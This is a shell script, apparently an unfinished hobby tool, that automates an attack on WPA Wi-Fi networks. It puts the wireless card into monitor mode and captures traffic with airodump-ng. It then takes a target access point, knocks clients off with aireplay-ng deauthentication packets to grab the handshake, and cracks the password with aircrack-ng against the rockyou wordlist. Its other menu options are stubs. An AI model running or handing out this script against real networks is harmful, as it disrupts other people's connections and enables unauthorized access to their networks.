#!/bin/sh

#-------------------------#
# User defined functions:
#-------------------------#

#obtain name of interface used for attack
obtain_interface (){
	INTERFACE="$(iw dev | awk '$1=="Interface" {print $2}')"

	clear
	echo "Now obtaining wireless interface name."
	sleep 1

	if [ -z "$INTERFACE" ];
	then
		echo No wireless interface has been detected.
		exit 0
	fi

	echo Wireless interface detected with name: $INTERFACE
	sleep 1
}

#changes wireless interface to monitor mode
monitor_mode (){
	echo Now switching wireless interface to monitor mode...
	sleep 1
	ifconfig $INTERFACE down
	iwconfig $INTERFACE mode monitor
	ifconfig $INTERFACE up
	echo Wireless interface now in monitor mode
}

#simple pause function
pause (){
	read -p "Press [enter] key to continue..." fackEnterKey
}

#displays intro description
show_intro (){
	clear
	printf "\n\n"
	tput setaf 4; cat logo.txt
	printf "\n"
	tput setaf 3; cat intro_head.txt
	echo "\e[34m#####################################################"
	tput setaf 7; cat intro_desc.txt
	echo "\e[34m#####################################################"
	tput setaf 7
	printf "\n"
}

#main menu
show_main_menu (){
	clear
	printf "\n"
	echo "-----------------"
	echo " Main Menu"
	echo "-----------------"
	echo "1. Reaver"
	echo "2. Crunch"
	echo "3. Wordlist"
	echo "0. Exit"
	echo "-----------------"
}

crunch_attack () {
	local APMAC CLMAC CH TEMPPID CHOICE HSHAKE

	clear
	echo Now starting crunch attack...
	sleep 2

	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &

	echo "Now attempting to capture packets..."
	sleep 2
	read -p "Enter BSSID of target access point: " APMAC
	sleep 1
	read -p "Enter client (STATION) address (optional): " CLMAC
	sleep 1

	echo "Retrieving $APMAC channel..."
	sleep 1

	TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
	CH=$(awk -F "\"*, \"*" '$1=="'$APMAC'" {print $4}' dumpfiles/dump-01.csv)
        echo "Access point found on channel: $CH"

	kill 15 $TEMPPID

	echo "Reattempting to capture packets on channel $CH..."
	x-terminal-emulator -e "airodump-ng -w crackfiles/psk -c $CH $INTERFACE" &

	sleep 2

	#FIND OUT HOW TO SEE IF HANDSHAKE WAS FOUND
	#solution: look at aircrack output: says no handshake found
		echo "Attempting to get WPA handshake on $APMAC..."
        	aireplay-ng -0 10 -a $APMAC -c $CLMAC $INTERFACE
		sleep 2
	        aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz -b $APMAC crackfiles/psk*.cap > output.txt

		#grep output.txt!!!!!! with "handshake" use the psk file psk-01 which doesnt have handshake for testing!
}


#read main menu choice
read_main_menu () {
	local CHOICE
	read -p "Enter choice [0-4]: " CHOICE
	case $CHOICE in
		1) echo reaver ;;
		2) crunch_attack ;;
		3) echo wordlist ;;
		0) echo "Now exiting..." && sleep 1 && exit 0 ;;
		*) echo "Entered invalid option..." && sleep 2 && read_main_menu
	esac
}


#------------------MAIN EXECUTION--------------------------#

show_intro
pause
obtain_interface
monitor_mode
show_main_menu
read_main_menu
